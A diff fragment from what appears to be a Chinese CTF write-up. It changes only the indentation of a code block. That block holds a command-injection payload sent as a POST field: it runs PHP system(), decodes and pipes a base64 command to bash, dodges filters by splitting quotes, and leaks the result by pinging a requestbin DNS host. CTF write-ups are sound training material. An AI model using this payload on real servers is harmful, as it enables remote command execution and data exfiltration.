@@ -149,11 +149,11 @@ POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh
 
 2. 因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下\${foo}。至于"$"符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：
 
-```
+   ```
     POST：girl_friend=php -r "system('ping '.substr(system('ec""ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba""se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');"
     
     YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== => a=$(find / -name flag);echo ${a:10:15}|base64
-```
+   ```
 
 3. 不得不说，上面这个方法太蛋疼了，得整一个VPS工具。
 
